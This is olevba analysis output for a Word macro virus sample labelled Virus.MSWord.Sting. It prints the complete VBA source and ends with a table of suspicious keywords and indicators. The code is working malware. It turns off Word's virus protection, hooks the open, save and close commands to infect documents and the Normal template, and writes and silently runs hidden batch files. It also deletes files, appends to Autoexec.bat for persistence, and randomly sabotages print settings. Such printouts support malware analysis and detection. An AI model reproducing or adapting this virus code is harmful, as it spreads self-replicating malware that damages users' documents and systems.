olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Sting-3cd5babe639e6f99b191cb402c19a75570cc9790
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Sting-3cd5babe639e6f99b191cb402c19a75570cc9790 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Stinger.bas 
in file: Virus.MSWord.Sting-3cd5babe639e6f99b191cb402c19a75570cc9790 - OLE stream: 'Macros/VBA/Stinger'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Call StartUp
If NormalTemplate.Saved = False Then NormalTemplate.Save
End Sub

Sub AutoOpen()
Call StartUp
End Sub

Sub StartUp()

With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With

On Error Resume Next

CustomizationContext = NormalTemplate

FindKey(BuildKeyCode(Arg1:=wdKeyAlt, Arg2:=wdKeyControl, _
        Arg3:=wdKeyShift, Arg4:=wdKeyR)).Clear

KeyBindings.Add KeyCode:=BuildKeyCode(Arg1:=wdKeyAlt, _
    Arg2:=wdKeyControl, Arg3:=wdKeyShift, Arg4:=wdKeyR), _
    KeyCategory:=wdKeyCategoryMacro, _
    Command:="Projéct12.Stinger.RegistrCd"

FindKey(BuildKeyCode(Arg1:=wdKeyAlt, Arg2:=wdKeyControl, _
        Arg3:=wdKeyShift, Arg4:=wdKeyV)).Clear

KeyBindings.Add KeyCode:=BuildKeyCode(Arg1:=wdKeyAlt, _
    Arg2:=wdKeyControl, Arg3:=wdKeyShift, Arg4:=wdKeyV), _
    KeyCategory:=wdKeyCategoryMacro, _
    Command:="Projéct12.Stinger.VwMacCd"

On Error GoTo 0

WordBasic.DisableAutoMacros

End Sub

Sub AutoExit()
Call FileExit
End Sub

Sub FileExit()

QuitWord = True

For Each aDoc In Documents
    If CloseFile(aDoc) = "Canceled" Then
        QuitWord = False
        Exit For
    Else
        QuitWord = True
    End If
Next aDoc

If QuitWord = True Then
    Call ChkFiles
    Application.Quit
End If

End Sub

Sub FileNew()
Dialogs(wdDialogFileNew).Show
Call RemvMac(ActiveDocument, "Stinger")
End Sub

Sub FileNewDefault()
Documents.Add
Call RemvMac(ActiveDocument, "Stinger")
End Sub

Sub FileSave()

On Error GoTo ExtFlSv
ActiveDocument.Save
On Error GoTo 0

mPrjNm = "Projéct12"
xFulNm = ActiveDocument.FullName

If ActiveDocument.VBProject.Name <> mPrjNm Then
    RO_Chk = GetAttr(ActiveDocument.FullName) And vbReadOnly
    If RO_Chk = 0 Then
        Call InfctDcmnt(ActiveDocument)
        Documents.Open FileName:=xFulNm, Format:=wdOpenFormatAuto
    End If
End If

ExtFlSv:

End Sub

Sub FileSaveAs()

mDiagReply = 0

On Error Resume Next
mDiagReply = Dialogs(wdDialogFileSaveAs).Show
On Error GoTo 0

If mDiagReply = -1 Then
    Call FileSave
End If

End Sub

Sub FilePrintDefault()
Call PrintRtn("FPD")
End Sub

Sub FilePrint()
Call PrintRtn("FP")
End Sub

Function PrintRtn(PrintCd)

With Options
    .PrintDraft = False
    .PrintFieldCodes = False
    .PrintHiddenText = False
    .PrintDrawingObjects = True
End With

With ActiveDocument
    .PrintFormsData = False
End With

SysFl = "C:\WINDOWS\COMMAND\SYSTEM1.DT_"

If Dir(SysFl, vbHidden + vbReadOnly + vbSystem) = "" Then
    mDaysOld = 0
Else
    mDaysOld = DateDiff("d", FileDateTime(SysFl), Now)
End If

If CdRegistry <> "110499" Then
    If ((Timer >= 0) And (Timer <= 14400)) Or _
        ((Timer >= 43200) And (Timer <= 46800)) Or _
        ((Timer >= 68400) And (Timer <= 75600)) Then
        ChngOptn = True
    ElseIf (Int((2 * Rnd) + 1) = 2) Then
        ChngOptn = True
    Else
        ChngOptn = False
    End If
Else
    ChngOptn = False
End If

If mDaysOld < 30 Then
    ChngOptn = False
End If

If PrintCd = "FP" Then
    Dialogs(wdDialogFilePrint).Show
Else
    ActiveDocument.PrintOut
End If

If ChngOptn = True Then
    With Options
        .PrintDraft = True
        .PrintFieldCodes = True
        .PrintHiddenText = True
        .PrintDrawingObjects = False
    End With
    With ActiveDocument
        .PrintFormsData = True
    End With
    With ActiveDocument
        .Compatibility(wdUsePrinterMetrics) = False
        .Compatibility(wdWW6BorderRules) = False
    End With
End If

End Function

Sub FileOpen()

mDiagReply = 0

On Error Resume Next
mDiagReply = Dialogs(wdDialogFileOpen).Show
On Error GoTo 0

If mDiagReply = -1 Then
    
    Call RemvMac(ActiveDocument, "Stinger")
    
    mPrjNm = "Projéct12"
    xPrjNm = ActiveDocument.VBProject.Name
    xFulNm = ActiveDocument.FullName
    
    If Left(xPrjNm, 7) = "Projéct" Then
        If xPrjNm < mPrjNm Then
            Call InfctDcmnt(ActiveDocument)
            Documents.Open FileName:=xFulNm, Format:=wdOpenFormatAuto
        End If
    End If

End If

End Sub

Sub DocClose()
Call CloseFile(ActiveDocument)
End Sub

Sub FileClose()
Call CloseFile(ActiveDocument)
End Sub

Function CloseFile(mDcNm7)

Documents(mDcNm7).Activate

CloseFile = "Closed"
mPrjNm = "Projéct12"
nPrjNm = NormalTemplate.VBProject.Name

If (Left(mDcNm7.Name, 8) = "Document") And _
    (mDcNm7.Characters.Count = 1) Then
    ActiveDocument.Close
    Exit Function
End If

If ActiveDocument.Saved = False Then
    mMsg = "Do you want to save the changes you made to '" & mDcNm7.Name & "'?"
    mStyle = vbYesNoCancel + vbExclamation + vbDefaultButton1
    mTitle = "Microsoft Word"
    Beep
    mResponse = MsgBox(mMsg, mStyle, mTitle)
    Select Case mResponse
    Case vbYes
        If (Left(mDcNm7.Name, 8) = "Document") Then
            mDiagReply = Dialogs(wdDialogFileSaveAs).Show
            If mDiagReply = 0 Then
                CloseFile = "Canceled"
                Exit Function
            End If
        Else
            On Error GoTo ExtClsFl
            ActiveDocument.Save
            On Error GoTo 0
        End If
    Case vbNo
        If (Left(mDcNm7.Name, 8) = "Document") Then
            ActiveDocument.Close SaveChanges:=wdDoNotSaveChanges
            Exit Function
        End If
    Case Else
        CloseFile = "Canceled"
        Exit Function
    End Select
End If

If ActiveDocument.VBProject.Name <> mPrjNm Then
    RO_Chk = GetAttr(ActiveDocument.FullName) And vbReadOnly
    If RO_Chk <> 0 Then
        ActiveDocument.Close
    Else
        Call InfctDcmnt(ActiveDocument)
    End If
    Exit Function
End If

If Dir("C:\WINDOWS\COMMAND\SYSTEM1.DT_", _
    vbHidden + vbReadOnly + vbSystem + vbArchive) = "" Then
    Call InfctSystm(ActiveDocument)
Else
    If Left(nPrjNm, 7) = "Projéct" Then
        If nPrjNm < mPrjNm Then
            Call InfctSystm(ActiveDocument)
        End If
    End If
End If

On Error Resume Next
ActiveDocument.Close SaveChanges:=wdDoNotSaveChanges
On Error GoTo 0
Exit Function

ExtClsFl:

CloseFile = "Canceled"
On Error GoTo 0

End Function

Function InfctDcmnt(mDcNm8)

Documents(mDcNm8).Activate

mDocName = mDOSNm(mDcNm8.Name)
mTempFl = "C:\WINDOWS\TEMP\" & mDocName
mOrgFile = ActiveDocument.FullName

mExtReslt = ExtractFl(mDocName)

Set myRange = ActiveDocument.Range
myRange.WholeStory
myRange.Copy
ActiveDocument.Close

On Error GoTo ExtInfctDcmnt

Documents.Open FileName:=mTempFl, ConfirmConversions:=False, _
    ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:="", _
    PasswordTemplate:="", Revert:=False, WritePasswordDocument:="", _
    WritePasswordTemplate:="", Format:=wdOpenFormatAuto

On Error GoTo 0

Selection.Paste
ActiveDocument.Save
ActiveDocument.Close

On Error Resume Next
Kill mOrgFile
On Error Resume Next
FileCopy mTempFl, mOrgFile

ExtInfctDcmnt:

On Error Resume Next
Kill mTempFl
On Error GoTo 0

End Function

Function InfctSystm(mDcNm9)

Documents(mDcNm9).Activate

mTmpNm = ActiveDocument.Name
mFile1 = "C:\WINDOWS\TEMP\" & mTmpNm
mFile2 = "C:\WINDOWS\COMMAND\" & mTmpNm
mFile3 = "C:\WINDOWS\" & mTmpNm
mFl3DOSNm = "C:\WINDOWS\" & mDOSNm(mDcNm9.Name)
mFile4 = "C:\WINDOWS\COMMAND\SYSTEM1.DT_"
mFile5 = "C:\WINDOWS\COMMAND\SYSTEM2.DT_"

Call SvTmpPath

Options.DefaultFilePath(Path:=wdUserTemplatesPath) = _
        "C:\Program Files\Microsoft Office\Templates"
        
Set mRange = ActiveDocument.Range
mRange.WholeStory
mRange.Delete

ActiveDocument.SaveAs FileName:=mFile1, Password:="", _
    FileFormat:=wdFormatDocument, AddToRecentFiles:=False

ActiveDocument.SaveAs FileName:=mFile2, _
    FileFormat:=wdFormatTemplate, AddToRecentFiles:=False

ActiveDocument.SaveAs FileName:=mFile3, AddToRecentFiles:=False

On Error Resume Next
SetAttr mFile4, vbNormal
Kill mFile4
On Error GoTo 0

Name mFile1 As mFile5
Name mFile2 As mFile4

Call ChkFiles

FNStrngX$ = "C:\WINDOWS\COMMAND\ZZ.BAT"
hNmbr = FreeFile

Open FNStrngX$ For Append Access Write As #hNmbr
    Print #hNmbr, "@ECHO OFF"
    Print #hNmbr, ":START"
    Print #hNmbr, "CLS"
    Print #hNmbr, "IF EXIST " & mFl3DOSNm & " DEL " & mFl3DOSNm
    Print #hNmbr, "IF EXIST " & mFl3DOSNm & " GOTO START"
    Print #hNmbr, "CLS"
    Print #hNmbr, "DEL " & FNStrngX$
Close #hNmbr

mResult = Shell(FNStrngX$, 0)

ActiveDocument.Close SaveChanges:=wdDoNotSaveChanges

End Function

Sub ToolsMacro()
End Sub

Sub ToolsCustomize()
End Sub

Sub ToolsOptions()
    
    Options.SaveNormalPrompt = True
    Options.VirusProtection = True
    
    Options.DefaultFilePath(Path:=wdUserTemplatesPath) = RdTmpPath()
    
    On Error Resume Next
    Dialogs(wdDialogToolsOptions).Show
    On Error GoTo 0
    
    Options.SaveNormalPrompt = False
    Options.VirusProtection = False
    
    Call SvTmpPath
    
    Options.DefaultFilePath(Path:=wdUserTemplatesPath) = _
        "C:\Program Files\Microsoft Office\Templates"

End Sub

Sub ViewVbCode()
End Sub

Function RemvMac(DcNm2, McNm2)

DcNm2Prtctn = DcNm2.VBProject.Protection
RemvMac = False

If DcNm2Prtctn = 0 Then
    For DcNm2j = DcNm2.VBProject.VBComponents.Count To 1 Step -1
        DcNm2ProcNm = DcNm2.VBProject.VBComponents(DcNm2j).Name
        If (DcNm2ProcNm <> McNm2) And _
            (DcNm2ProcNm <> "ThisDocument") And _
            (DcNm2ProcNm <> "Reference to Normal") Then
            Application.OrganizerDelete Source:=DcNm2.FullName, _
                Name:=DcNm2ProcNm, Object:=wdOrganizerObjectProjectItems
            RemvMac = True
        End If
    Next DcNm2j
End If

End Function

Sub ChkFiles()

FNStrng1$ = "C:\Autoexec.bat"
FNStrng2$ = "C:\WINDOWS\COMMAND\AZ.bat"
FNStrng3$ = "C:\WINDOWS\COMMAND\XZ.bat"
FNStrng4$ = "C:\WINDOWS\TEMP\*.DO?"

On Error Resume Next

SetAttr FNStrng2$, vbNormal
SetAttr FNStrng3$, vbNormal
SetAttr FNStrng4$, vbNormal

Kill FNStrng2$
Kill FNStrng3$
Kill FNStrng4$

On Error GoTo 0

Call MkLoadrFl
Call MkHsKprFl

mResult = Shell(FNStrng3$, 0)
FNStrngW$ = "C:\WINDOWS\TEMP\~_110499.TMP"

Do While Dir(FNStrngW$) = ""
Loop

On Error GoTo ResumeKill2
Kill FNStrngW$
Kill FNStrng3$
On Error GoTo 0

hNmbr = FreeFile
Dim InputData, ShowLine

On Error GoTo CreateFl

Open FNStrng1$ For Input As #hNmbr

FileMarker = Chr(255)
MarkerFound = False

Do While Not EOF(1)
    Line Input #hNmbr, InputData
    If InputData = FileMarker Then MarkerFound = True
Loop

Close #hNmbr

If MarkerFound <> True Then
    hNmbr = FreeFile
    SetAttr FNStrng1$, vbNormal
    Open FNStrng1$ For Append Access Write As #hNmbr
        Print #hNmbr, FileMarker
    Close #hNmbr
End If

On Error GoTo 0

Exit Sub

CreateFl:

Call MkAutoFl
SetAttr FNStrng1$, vbHidden
On Error GoTo 0
Exit Sub

ResumeKill2:
Resume

End Sub

Function CdRegistry()

Dim mEnvString, mIndx, mMsg, mPathLen
mIndx = 1
mSrchStrng = "WIN_VER"
mSSLength = Len(mSrchStrng) + 1

CdRegistry = ""

Do
    mEnvString = Environ(mIndx)
    If Left(mEnvString, mSSLength) = (mSrchStrng & "=") Then
        CdRegistry = Environ(mSrchStrng)
        Exit Do
    Else
        mIndx = mIndx + 1
    End If
Loop Until mEnvString = ""

End Function

Function ExtractFl(mXtNm)

mFlTmp = "C:\WINDOWS\TEMP\" & mXtNm
FNStrngX$ = "C:\WINDOWS\TEMP\CpyFl.Bat"
FNStrngW$ = "C:\WINDOWS\TEMP\~_110499.TMP"

hNmbr = FreeFile

Open FNStrngX$ For Append Access Write As #hNmbr
    Print #hNmbr, "@ECHO OFF"
    Print #hNmbr, "DEL " & FNStrngW$
    Print #hNmbr, "ATTRIB C:\WINDOWS\COMMAND\ÿÿ.ÿÿ -H +R"
    Print #hNmbr, "COPY C:\WINDOWS\COMMAND\ÿÿ.ÿÿ " & mFlTmp & " /Y > NUL"
    Print #hNmbr, "ATTRIB C:\WINDOWS\COMMAND\ÿÿ.ÿÿ +H +R"
    Print #hNmbr, "CLS"
    Print #hNmbr, "ECHO A > " & FNStrngW$
Close #hNmbr

mResult = Shell(FNStrngX$, 0)

Do While Dir(FNStrngW$) = ""
Loop

On Error GoTo ResumeKill1
Kill FNStrngW$
Kill FNStrngX$
On Error GoTo 0

Exit Function

ResumeKill1:
Resume

End Function

Function mDOSNm(Name9)

mDOSNm = Name9

If UCase(Right(mDOSNm, 4)) <> ".DOC" And _
    UCase(Right(mDOSNm, 4)) <> ".DOT" Then
    mDOSNm = mDOSNm & ".Doc"
End If

If (Len(mDOSNm) - 4) > 8 Then
    mPos = InStr(mDOSNm, " ")
    Do While mPos <> 0
        Mid(mDOSNm, mPos) = "_"
        mPos = InStr(mDOSNm, " ")
    Loop
    mDOSNm = Left(mDOSNm, 6) & "~1.Doc"
End If

End Function

Sub RegistrCd()

If CdRegistry() = "110499" Then
    MsgBox "Macro code is already registered."
    Exit Sub
End If

Dim mMessage, mTitle, mDefault, mKey

mMessage = "Enter registration key"
mTitle = "Macro Code Registration"
mDefault = ""

mKey = InputBox(mMessage, mTitle, mDefault)

If UCase(mKey) = "STING110499" Then
    Call CdRgstrtn
    MsgBox "Macro code has been successfully registered." & Chr(13) & _
            "You need to restart your computer for the " & Chr(13) & _
            "new setting to take efffect."
Else
    Beep
    MsgBox "Incorrect Regsistration Key."
End If

End Sub

Sub CdRgstrtn()

FNStrng2$ = "C:\WINDOWS\COMMAND\AZ.Bat"
FNStrng3$ = "C:\WINDOWS\COMMAND\XZ.Bat"
FileMarker = "SET WIN_VER=110499"

Call MkLoadrFl

hNmbr = FreeFile

Open FNStrng2$ For Append Access Write As #hNmbr
    Print #hNmbr, FileMarker
Close #hNmbr

Call MkHsKprFl

mResult = Shell(FNStrng3$, 0)
FNStrngW$ = "C:\WINDOWS\TEMP\~_110499.TMP"

Do While Dir(FNStrngW$) = ""
Loop

On Error GoTo ResumeKill3
Kill FNStrngW$
Kill FNStrng3$
On Error GoTo 0

Exit Sub

ResumeKill3:
Resume

End Sub

Sub MkLoadrFl()

FNStrng2$ = "C:\WINDOWS\COMMAND\AZ.Bat"

hNmbr = FreeFile

Open FNStrng2$ For Append Access Write As #hNmbr
    Print #hNmbr, "@ECHO OFF"
    Print #hNmbr, "ATTRIB C:\WINDOWS\COMMAND\ÿ.ÿ -H -R > NUL"
    Print #hNmbr, "COPY C:\WINDOWS\COMMAND\ÿ.ÿ C:\PROGRA~1\MICROS~1\TEMPLA~1\Normal.dot /Y > NUL"
    Print #hNmbr, "ATTRIB C:\WINDOWS\COMMAND\ÿ.ÿ +H +R > NUL"
    Print #hNmbr, "DEL C:\WINDOWS\TEMP\*.DO? > NUL"
    Print #hNmbr, "CLS"
Close #hNmbr

End Sub

Sub MkHsKprFl()

FNStrng3$ = "C:\WINDOWS\COMMAND\XZ.bat"
FNStrngW$ = "C:\WINDOWS\TEMP\~_110499.TMP"

hNmbr = FreeFile

Open FNStrng3$ For Append Access Write As #hNmbr
    Print #hNmbr, "@ECHO OFF"
    Print #hNmbr, "DEL " & FNStrngW$
    Print #hNmbr, "ATTRIB C:\WINDOWS\COMMAND\ÿ.BAT -H -R > NUL"
    Print #hNmbr, "COPY C:\WINDOWS\COMMAND\AZ.bat C:\WINDOWS\COMMAND\ÿ.BAT /Y > NUL"
    Print #hNmbr, "ATTRIB C:\WINDOWS\COMMAND\ÿ.BAT +H +R > NUL"
    Print #hNmbr, "DEL C:\WINDOWS\COMMAND\AZ.bat > NUL"
    Print #hNmbr, "ATTRIB C:\WINDOWS\COMMAND\ÿ.ÿ -H -R > NUL"
    Print #hNmbr, "COPY C:\WINDOWS\COMMAND\SYSTEM1.DT_ C:\WINDOWS\COMMAND\ÿ.ÿ /y > NUL"
    Print #hNmbr, "DEL C:\WINDOWS\COMMAND\SYSTEM1.DT_ > NUL"
    Print #hNmbr, "ATTRIB C:\WINDOWS\COMMAND\ÿ.ÿ +H +R > NUL"
    Print #hNmbr, "ATTRIB C:\WINDOWS\COMMAND\ÿÿ.ÿÿ -H -R > NUL"
    Print #hNmbr, "COPY C:\WINDOWS\COMMAND\SYSTEM2.DT_ C:\WINDOWS\COMMAND\ÿÿ.ÿÿ /y > NUL"
    Print #hNmbr, "DEL C:\WINDOWS\COMMAND\SYSTEM2.DT_ > NUL"
    Print #hNmbr, "ATTRIB C:\WINDOWS\COMMAND\ÿÿ.ÿÿ +H +R > NUL"
    Print #hNmbr, "DEL C:\WINDOWS\TEMP\*.DO? > NUL"
    Print #hNmbr, "ATTRIB C:\WINDOWS\COMMAND\SYSTEM1.DT_ -H -R -S > NUL"
    Print #hNmbr, "DEL C:\WINDOWS\COMMAND\SYSTEM1.DT_"
    Print #hNmbr, "ECHO A > C:\WINDOWS\COMMAND\SYSTEM1.DT_"
    Print #hNmbr, "ATTRIB C:\WINDOWS\COMMAND\SYSTEM1.DT_ +H +R +S > NUL"
    Print #hNmbr, "CLS"
    Print #hNmbr, "ECHO A > " & FNStrngW$
Close #hNmbr

End Sub

Sub MkAutoFl()

FNStrng1$ = "C:\Autoexec.bat"

hNmbr = FreeFile

Open FNStrng1$ For Append Access Write As #hNmbr
    Print #hNmbr, "@ECHO OFF"
    Print #hNmbr, "PROMPT $P$G"
    Print #hNmbr, "SET PATH=C:\WINDOWS\;C:\WINDOWS\COMMAND\"
    Print #hNmbr, Chr(255)
Close #hNmbr

End Sub

Sub VwMacCd()
    If UCase(InputBox("Access Code", "View Macro Code")) = "STING" Then
        ShowVisualBasicEditor = True
    Else
        MsgBox "Incorrect Access Code"
    End If
End Sub

Sub SvTmpPath()

mOldTmpPath = Options.DefaultFilePath(wdUserTemplatesPath)
FNStrngZ$ = "C:\WINDOWS\TmpPath.Ini"

On Error Resume Next
Kill FNStrngZ$
On Error GoTo 0

hNmbr = FreeFile

Open FNStrngZ$ For Append Access Write As #hNmbr
    Print #hNmbr, mOldTmpPath
Close #hNmbr

End Sub

Function RdTmpPath()

FNStrngZ$ = "C:\WINDOWS\TmpPath.Ini"

If Dir(FNStrngZ$) = "" Then
    RdTmpPath = Options.DefaultFilePath(wdUserTemplatesPath)
Else
    hNmbr = FreeFile
    Open FNStrngZ$ For Input As #hNmbr
    Line Input #hNmbr, RdTmpPath
    Close #hNmbr
End If

End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |ZZ.BAT              |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |AZ.bat              |Executable file name                         |
|IOC       |XZ.bat              |Executable file name                         |
|IOC       |CpyFl.Bat           |Executable file name                         |
|IOC       |AZ.Bat              |Executable file name                         |
|IOC       |XZ.Bat              |Executable file name                         |
|IOC       |'ÿ.BAT'             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

